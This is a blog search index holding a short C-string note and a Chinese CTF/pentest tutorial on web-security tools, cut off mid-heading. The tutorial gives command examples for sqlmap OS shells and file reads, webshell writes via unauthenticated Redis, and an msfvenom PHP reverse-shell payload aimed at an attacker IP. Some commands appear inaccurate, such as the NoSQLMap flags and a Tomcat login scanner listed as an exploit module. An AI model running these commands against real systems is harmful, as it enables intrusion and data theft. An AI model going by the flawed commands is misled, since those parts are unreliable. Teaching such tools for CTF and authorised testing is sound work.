<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C语言字符串输入方法完全总结</title>
      <link href="/2025/12/03/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/%E8%BE%93%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
      <url>/2025/12/03/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/%E8%BE%93%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、核心概念区分"><a href="#一、核心概念区分" class="headerlink" title="一、核心概念区分"></a>一、核心概念区分</h2><h3 id="字符数组-vs-字符串"><a href="#字符数组-vs-字符串" class="headerlink" title="字符数组 vs 字符串"></a>字符数组 vs 字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符数组：只是一组字符的集合</span></span><br><span class="line"><span class="type">char</span> arr1[<span class="number">5</span>] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>&#125;;  <span class="comment">// 不是字符串！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串：以 &#x27;\0&#x27; 结尾的字符数组</span></span><br><span class="line"><span class="type">char</span> str1[<span class="number">6</span>] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;  <span class="comment">// 是字符串</span></span><br><span class="line"><span class="type">char</span> str2[] = <span class="string">&quot;Hello&quot;</span>;  <span class="comment">// 自动加 &#x27;\0&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="内存对比"><a href="#内存对比" class="headerlink" title="内存对比"></a>内存对比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符数组 &quot;Hello&quot; 的内存布局：</span><br><span class="line">地址:  0x1000 0x1001 0x1002 0x1003 0x1004 0x1005</span><br><span class="line">值:    &#x27;H&#x27;    &#x27;e&#x27;    &#x27;l&#x27;    &#x27;l&#x27;    &#x27;o&#x27;    &#x27;\0&#x27;</span><br></pre></td></tr></table></figure><h2 id="二、常用输入方法对比表"><a href="#二、常用输入方法对比表" class="headerlink" title="二、常用输入方法对比表"></a>二、常用输入方法对比表</h2><table><thead><tr><th>方法</th><th>语法示例</th><th>是否读取空格</th><th>是否安全</th><th>是否会读取’\n’</th><th>适用场景</th></tr></thead><tbody><tr><td>scanf(“%s”)</td><td>scanf(“%s”, str)</td><td>❌ 不读空格</td><td>❌ 不安全（可能溢出）</td><td>❌ 不读换行符</td><td>读取单个单词</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web工具配置与使用</title>
      <link href="/2025/12/03/web/web%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/12/03/web/web%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-2-4-Web-工具配置与使用"><a href="#1-2-4-Web-工具配置与使用" class="headerlink" title="1.2.4 Web 工具配置与使用"></a>1.2.4 Web 工具配置与使用</h1><p>Web安全工具是漏洞挖掘、漏洞利用及实战攻防的核心支撑，本节聚焦CTF与真实渗透场景中高频使用的工具，详细说明其核心功能、基础配置及实战技巧，同时补充多款必备工具，覆盖“信息收集-漏洞探测-漏洞利用-数据处理”全流程。</p><h2 id="1-2-4-1-抓包工具（Burp-Suite、Fiddler、Wireshark）"><a href="#1-2-4-1-抓包工具（Burp-Suite、Fiddler、Wireshark）" class="headerlink" title="1.2.4.1 抓包工具（Burp Suite、Fiddler、Wireshark）"></a>1.2.4.1 抓包工具（Burp Suite、Fiddler、Wireshark）</h2><h3 id="关键掌握点：核心功能、配置要点、CTF实战场景"><a href="#关键掌握点：核心功能、配置要点、CTF实战场景" class="headerlink" title="关键掌握点：核心功能、配置要点、CTF实战场景"></a>关键掌握点：核心功能、配置要点、CTF实战场景</h3><h4 id="1-Burp-Suite（Web抓包-渗透核心工具，推荐专业版）"><a href="#1-Burp-Suite（Web抓包-渗透核心工具，推荐专业版）" class="headerlink" title="1. Burp Suite（Web抓包&#x2F;渗透核心工具，推荐专业版）"></a>1. Burp Suite（Web抓包&#x2F;渗透核心工具，推荐专业版）</h4><ul><li><p>核心功能：</p></li><li><p>抓包拦截：捕获HTTP&#x2F;HTTPS请求与响应，支持手动修改参数后重放；</p></li><li><p>漏洞扫描：专业版自带主动扫描模块，检测SQL注入、XSS、CSRF等常见漏洞；</p></li><li><p>爆破攻击：Intruder模块支持密码爆破、参数fuzz、目录枚举；</p></li><li><p>编码转换：Decoder模块支持URL、Base64、Hex等多种编码&#x2F;解密；</p></li><li><p>自定义脚本：通过Burp Suite Extender加载插件（如SQLiPy、Log4jScan）扩展功能。</p></li><li><p>基础配置（CTF必备）：</p></li><li><p>代理设置：默认代理为127.0.0.1:8080，需在浏览器（Chrome&#x2F;Firefox）中配置对应代理；</p></li><li><p>HTTPS抓包：安装Burp CA证书（浏览器访问<a href="http://burp下载证书并导入),解决https流量解密问题;/">http://burp下载证书并导入），解决HTTPS流量解密问题；</a></p></li><li><p>过滤规则：在Proxy→Options中设置Target Scope（目标范围），避免捕获无关流量。</p></li><li><p>CTF实战技巧：</p></li><li><p>重放攻击：捕获登录、修改密码等请求后，在Repeater模块修改参数（如用户ID、金额）重放，验证逻辑漏洞；</p></li><li><p>密码爆破：Intruder模块选择“Sniper”模式，针对登录密码参数，加载字典（如rockyou.txt）进行暴力破解；</p></li><li><p>绕过防护：通过Decoder模块对Payload进行多轮编码（如URL+Base64），绕过简单WAF；</p></li><li><p>插件利用：加载“Log4j2 Scan”插件，自动检测请求中的Log4j2漏洞触发点。</p></li></ul><h4 id="2-Fiddler（轻量抓包工具，适合Windows环境）"><a href="#2-Fiddler（轻量抓包工具，适合Windows环境）" class="headerlink" title="2. Fiddler（轻量抓包工具，适合Windows环境）"></a>2. Fiddler（轻量抓包工具，适合Windows环境）</h4><ul><li><p>核心优势：操作简单、支持手机端抓包、内置编码&#x2F;解密工具，适合快速验证漏洞。</p></li><li><p>实战配置：</p></li><li><p>手机抓包：电脑与手机处于同一局域网，设置手机代理为电脑IP:8888，访问http:&#x2F;&#x2F;电脑IP:8888下载证书；</p></li><li><p>HTTPS配置：Tools→Options→HTTPS，勾选“Decrypt HTTPS traffic”，解决HTTPS抓包问题。</p></li><li><p>CTF场景：快速拦截移动端Webview请求、分析AJAX动态加载的接口参数。</p></li></ul><h4 id="3-Wireshark（全流量抓包工具，支持TCP-UDP-HTTP等协议）"><a href="#3-Wireshark（全流量抓包工具，支持TCP-UDP-HTTP等协议）" class="headerlink" title="3. Wireshark（全流量抓包工具，支持TCP&#x2F;UDP&#x2F;HTTP等协议）"></a>3. Wireshark（全流量抓包工具，支持TCP&#x2F;UDP&#x2F;HTTP等协议）</h4><ul><li><p>核心功能：捕获局域网内所有流量，适合分析非HTTP协议漏洞（如Redis、MySQL协议）、网络攻击溯源。</p></li><li><p>CTF实战技巧：</p></li><li><p>过滤规则：输入“http”只显示HTTP流量、“tcp.port &#x3D;&#x3D; 6379”过滤Redis流量、“ip.addr &#x3D;&#x3D; 192.168.1.100”过滤目标IP流量；</p></li><li><p>流量分析：在CTF“流量分析题”中，通过Wireshark提取敏感信息（如账号密码、flag）、还原攻击流程。</p></li></ul><h2 id="1-2-4-2-注入工具（SQLmap、NoSQLMap、XPATH-Injector）"><a href="#1-2-4-2-注入工具（SQLmap、NoSQLMap、XPATH-Injector）" class="headerlink" title="1.2.4.2 注入工具（SQLmap、NoSQLMap、XPATH Injector）"></a>1.2.4.2 注入工具（SQLmap、NoSQLMap、XPATH Injector）</h2><h3 id="关键掌握点：工具选型、核心命令、绕过技巧"><a href="#关键掌握点：工具选型、核心命令、绕过技巧" class="headerlink" title="关键掌握点：工具选型、核心命令、绕过技巧"></a>关键掌握点：工具选型、核心命令、绕过技巧</h3><h4 id="1-SQLmap（自动化SQL注入工具，支持多种数据库）"><a href="#1-SQLmap（自动化SQL注入工具，支持多种数据库）" class="headerlink" title="1. SQLmap（自动化SQL注入工具，支持多种数据库）"></a>1. SQLmap（自动化SQL注入工具，支持多种数据库）</h4><ul><li><p>核心功能：自动检测SQL注入类型（布尔盲注、时间盲注、报错注入）、获取数据库信息、读取文件、执行系统命令。</p></li><li><p>基础配置：Python环境运行（推荐Python 3.7+），直接下载源码或通过pip安装。</p></li><li><p>CTF高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1. 检测目标URL是否存在SQL注入</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 加载Burp捕获的请求文件（适合POST注入、带Cookie的注入）</span></span><br><span class="line"></span><br><span class="line">sqlmap -r request.txt  <span class="comment"># request.txt为Burp导出的请求包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 获取所有数据库名称</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 获取指定数据库的所有表</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span> -D <span class="string">&quot;testdb&quot;</span> --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 读取文件（如/etc/passwd、flag文件）</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span> --file-read <span class="string">&quot;/flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 执行系统命令（需数据库权限足够，如root）</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span> --os-shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 绕过WAF（使用tamper脚本）</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/index.php?id=1&quot;</span> --tamper <span class="string">&quot;space2comment,apostrophemask&quot;</span>  <span class="comment"># 空格替换为注释、单引号编码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>实战技巧：遇到“注入点存在但无法直接读取文件”时，可通过–os-shell反弹shell，或写入webshell到网站目录。</li></ul><h4 id="2-NoSQLMap（自动化NoSQL注入工具，支持MongoDB-Redis等）"><a href="#2-NoSQLMap（自动化NoSQL注入工具，支持MongoDB-Redis等）" class="headerlink" title="2. NoSQLMap（自动化NoSQL注入工具，支持MongoDB&#x2F;Redis等）"></a>2. NoSQLMap（自动化NoSQL注入工具，支持MongoDB&#x2F;Redis等）</h4><ul><li><p>核心场景：针对MongoDB的基于布尔的盲注、Redis未授权访问利用。</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 检测MongoDB注入</span></span><br><span class="line"></span><br><span class="line">nosqlmap -u <span class="string">&quot;http://target.com/index.php?user=test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用Redis未授权访问写入webshell</span></span><br><span class="line"></span><br><span class="line">nosqlmap -u <span class="string">&quot;redis://192.168.1.100:6379&quot;</span> --redis-shell --write-shell <span class="string">&quot;/var/www/html/shell.php&quot;</span> --shell-type <span class="string">&quot;php&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-XPATH-Injector（XPATH注入专用工具）"><a href="#3-XPATH-Injector（XPATH注入专用工具）" class="headerlink" title="3. XPATH Injector（XPATH注入专用工具）"></a>3. XPATH Injector（XPATH注入专用工具）</h4><ul><li><p>核心场景：针对XML格式数据的注入漏洞（如SOAP接口、XML配置文件），自动检测并利用注入点。</p></li><li><p>实战要点：需手动导入目标XML请求，工具自动生成Payload并验证注入可行性。</p></li></ul><h2 id="1-2-4-3-扫描工具（Nmap、AWVS、Dirsearch、FFuF、WhatWeb）"><a href="#1-2-4-3-扫描工具（Nmap、AWVS、Dirsearch、FFuF、WhatWeb）" class="headerlink" title="1.2.4.3 扫描工具（Nmap、AWVS、Dirsearch、FFuF、WhatWeb）"></a>1.2.4.3 扫描工具（Nmap、AWVS、Dirsearch、FFuF、WhatWeb）</h2><h3 id="关键掌握点：信息收集、漏洞扫描、目录枚举，覆盖“外网探测-内网测绘”全场景"><a href="#关键掌握点：信息收集、漏洞扫描、目录枚举，覆盖“外网探测-内网测绘”全场景" class="headerlink" title="关键掌握点：信息收集、漏洞扫描、目录枚举，覆盖“外网探测-内网测绘”全场景"></a>关键掌握点：信息收集、漏洞扫描、目录枚举，覆盖“外网探测-内网测绘”全场景</h3><h4 id="1-Nmap（网络扫描工具，端口-服务-漏洞探测）"><a href="#1-Nmap（网络扫描工具，端口-服务-漏洞探测）" class="headerlink" title="1. Nmap（网络扫描工具，端口&#x2F;服务&#x2F;漏洞探测）"></a>1. Nmap（网络扫描工具，端口&#x2F;服务&#x2F;漏洞探测）</h4><ul><li><p>核心功能：端口扫描、服务版本识别、操作系统指纹识别、脚本扫描（漏洞探测）。</p></li><li><p>CTF高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1. 全端口扫描（快速识别开放端口）</span></span><br><span class="line"></span><br><span class="line">nmap -p 1-65535 -T4 192.168.1.100  <span class="comment"># -T4为扫描速度等级（1-5，越快越容易被检测）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 服务版本与操作系统识别</span></span><br><span class="line"></span><br><span class="line">nmap -sV -O 192.168.1.100  <span class="comment"># -sV识别服务版本，-O识别操作系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 脚本扫描（检测常见漏洞，如Redis未授权、Tomcat弱口令）</span></span><br><span class="line"></span><br><span class="line">nmap --script=vuln 192.168.1.100  <span class="comment"># 加载vuln脚本库</span></span><br><span class="line"></span><br><span class="line">nmap --script=redis-info 192.168.1.100:6379  <span class="comment"># 针对Redis的专用脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 内网存活主机探测（无ping扫描，避免被防火墙拦截）</span></span><br><span class="line"></span><br><span class="line">nmap -sn -Pn 192.168.1.0/24  <span class="comment"># -sn不扫描端口，仅探测存活主机；-Pn跳过ping检测</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>实战技巧：CTF中常用于“内网渗透”环节，通过扫描内网网段获取存活主机与开放服务，寻找下一步攻击目标（如内网Redis、MySQL服务）。</li></ul><h4 id="2-AWVS（Acunetix-Web-Vulnerability-Scanner，Web漏洞扫描工具）"><a href="#2-AWVS（Acunetix-Web-Vulnerability-Scanner，Web漏洞扫描工具）" class="headerlink" title="2. AWVS（Acunetix Web Vulnerability Scanner，Web漏洞扫描工具）"></a>2. AWVS（Acunetix Web Vulnerability Scanner，Web漏洞扫描工具）</h4><ul><li><p>核心功能：自动化检测SQL注入、XSS、文件上传、目录遍历、框架漏洞（如Log4j2、ThinkPHP）等Web漏洞。</p></li><li><p>实战配置：</p></li><li><p>新建扫描任务：输入目标URL，选择扫描模式（Full Scan全面扫描、Quick Scan快速扫描）；</p></li><li><p>配置排除规则：排除登录页面、验证码页面，避免扫描干扰；</p></li><li><p>查看报告：扫描完成后，在报告中查看漏洞详情、修复建议及PoC（验证代码）。</p></li><li><p>优势：误报率低、支持API集成、可导出详细报告，适合快速定位目标Web服务的高危漏洞。</p></li></ul><h4 id="3-Dirsearch（目录-文件枚举工具，Python编写）"><a href="#3-Dirsearch（目录-文件枚举工具，Python编写）" class="headerlink" title="3. Dirsearch（目录&#x2F;文件枚举工具，Python编写）"></a>3. Dirsearch（目录&#x2F;文件枚举工具，Python编写）</h4><ul><li><p>核心功能：通过字典爆破Web服务器的隐藏目录、敏感文件（如config.php、flag.txt、后台登录页）。</p></li><li><p>基础配置：需提前准备字典（工具自带字典在wordlists目录，推荐补充rockyou.txt、dirbuster.txt）。</p></li><li><p>CTF高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1. 基础目录扫描（指定目标URL，默认字典）</span></span><br><span class="line"></span><br><span class="line">python dirsearch.py -u <span class="string">&quot;http://target.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 指定文件后缀扫描（寻找php、html、txt文件）</span></span><br><span class="line"></span><br><span class="line">python dirsearch.py -u <span class="string">&quot;http://target.com&quot;</span> -e php,html,txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 使用自定义字典扫描</span></span><br><span class="line"></span><br><span class="line">python dirsearch.py -u <span class="string">&quot;http://target.com&quot;</span> -w /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 忽略404状态码，只显示200、302状态</span></span><br><span class="line"></span><br><span class="line">python dirsearch.py -u <span class="string">&quot;http://target.com&quot;</span> --exclude-status 404</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 带Cookie扫描（针对需要登录的目录）</span></span><br><span class="line"></span><br><span class="line">python dirsearch.py -u <span class="string">&quot;http://target.com&quot;</span> -c <span class="string">&quot;session=abc123&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-FFuF（高速目录-参数fuzz工具，Go编写，比Dirsearch更快）"><a href="#4-FFuF（高速目录-参数fuzz工具，Go编写，比Dirsearch更快）" class="headerlink" title="4. FFuF（高速目录&#x2F;参数fuzz工具，Go编写，比Dirsearch更快）"></a>4. FFuF（高速目录&#x2F;参数fuzz工具，Go编写，比Dirsearch更快）</h4><ul><li><p>核心优势：多线程并发、支持参数fuzz、Cookie池配置，适合大规模目录枚举与参数爆破。</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1. 目录扫描（-w指定字典，-u指定目标，FUZZ为占位符）</span></span><br><span class="line"></span><br><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 文件后缀扫描</span></span><br><span class="line"></span><br><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 参数fuzz（探测URL中的隐藏参数，如?id=FUZZ）</span></span><br><span class="line"></span><br><span class="line">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://target.com/index.php?FUZZ=1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-WhatWeb（Web指纹识别工具）"><a href="#5-WhatWeb（Web指纹识别工具）" class="headerlink" title="5. WhatWeb（Web指纹识别工具）"></a>5. WhatWeb（Web指纹识别工具）</h4><ul><li><p>核心功能：识别目标Web服务器类型（如Nginx、Apache）、开发框架（如ThinkPHP、Spring Boot）、CMS系统（如WordPress、Dedecms）、脚本语言（PHP、Java）。</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 基础指纹识别</span></span><br><span class="line"></span><br><span class="line">whatweb http://target.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细输出模式（显示更多指纹信息）</span></span><br><span class="line"></span><br><span class="line">whatweb -v http://target.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量识别多个目标（从文件中读取URL列表）</span></span><br><span class="line"></span><br><span class="line">whatweb -i urls.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>实战价值：快速定位目标使用的技术栈，为后续漏洞挖掘提供方向（如识别出Log4j2则尝试JNDI注入，识别出ThinkPHP则查找对应版本漏洞）。</li></ul><h2 id="1-2-4-4-漏洞利用工具（Metasploit、Exploit-DB、Log4j-scan、JNDI-Injection-Exploit）"><a href="#1-2-4-4-漏洞利用工具（Metasploit、Exploit-DB、Log4j-scan、JNDI-Injection-Exploit）" class="headerlink" title="1.2.4.4 漏洞利用工具（Metasploit、Exploit-DB、Log4j-scan、JNDI-Injection-Exploit）"></a>1.2.4.4 漏洞利用工具（Metasploit、Exploit-DB、Log4j-scan、JNDI-Injection-Exploit）</h2><h3 id="关键掌握点：漏洞exp利用、反弹shell、专项漏洞检测，覆盖CTF高频漏洞场景"><a href="#关键掌握点：漏洞exp利用、反弹shell、专项漏洞检测，覆盖CTF高频漏洞场景" class="headerlink" title="关键掌握点：漏洞exp利用、反弹shell、专项漏洞检测，覆盖CTF高频漏洞场景"></a>关键掌握点：漏洞exp利用、反弹shell、专项漏洞检测，覆盖CTF高频漏洞场景</h3><h4 id="1-Metasploit（渗透测试框架，集成海量漏洞exp-poc）"><a href="#1-Metasploit（渗透测试框架，集成海量漏洞exp-poc）" class="headerlink" title="1. Metasploit（渗透测试框架，集成海量漏洞exp&#x2F;poc）"></a>1. Metasploit（渗透测试框架，集成海量漏洞exp&#x2F;poc）</h4><ul><li><p>核心组成：msfconsole（命令行控制台）、msfvenom（恶意 payload 生成工具）、各类漏洞模块（exploit&#x2F;poc）。</p></li><li><p>基础使用流程（CTF实战）：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1. 启动msfconsole</span></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索目标漏洞模块（如Tomcat 弱口令、Log4j2）</span></span><br><span class="line"></span><br><span class="line">search tomcat  <span class="comment"># 搜索Tomcat相关模块</span></span><br><span class="line"></span><br><span class="line">search log4j2  <span class="comment"># 搜索Log4j2相关模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 加载漏洞模块</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/http/tomcat_mgr_login  <span class="comment"># Tomcat管理后台弱口令模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看模块参数</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置参数（RHOSTS目标IP、RPORT端口、USERNAME用户名、PASSWORD密码）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.100</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> USERNAME admin</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PASSWORD admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 执行模块</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 生成反弹shell payload（如php反弹shell）</span></span><br><span class="line"></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击者IP LPORT=4444 -f raw &gt; shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>CTF高频模块：</p></li><li><p>exploit&#x2F;multi&#x2F;http&#x2F;log4shell_rce：Log4j2远程代码执行模块；</p></li><li><p>exploit&#x2F;unix&#x2F;webapp&#x2F;thinkphp_rce：ThinkPHP框架远程代码执行模块；</p></li><li><p>payload&#x2F;linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp：Linux系统反弹shell payload；</p></li><li><p>payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp：Windows系统反弹shell payload。</p></li></ul><h4 id="2-Exploit-DB与SearchSploit"><a href="#2-Exploit-DB与SearchSploit" class="headerlink" title="2. Exploit-DB与SearchSploit"></a>2. Exploit-DB与SearchSploit</h4><ul><li><p>Exploit-DB：全球最大的漏洞exp&#x2F;poc库（<a href="https://www.exploit-db.com/%EF%BC%89%EF%BC%8C%E5%8F%AF%E6%90%9C%E7%B4%A2%E7%9B%AE%E6%A0%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%85%AC%E5%BC%80%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%EF%BC%9B">https://www.exploit-db.com/），可搜索目标漏洞的公开利用代码；</a></p></li><li><p>SearchSploit：Exploit-DB的本地命令行工具，无需联网即可搜索本地exp库。</p></li><li><p>高频命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 搜索Log4j2相关exp</span></span><br><span class="line"></span><br><span class="line">searchsploit log4j2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索ThinkPHP 5.0相关exp</span></span><br><span class="line"></span><br><span class="line">searchsploit ThinkPHP 5.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看exp详情并复制到当前目录</span></span><br><span class="line"></span><br><span class="line">searchsploit -x 50439  <span class="comment"># -x查看详情，50439为exp编号</span></span><br><span class="line"></span><br><span class="line">searchsploit -m 50439  <span class="comment"># -m复制exp到当前目录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-专项漏洞利用工具"><a href="#3-专项漏洞利用工具" class="headerlink" title="3. 专项漏洞利用工具"></a>3. 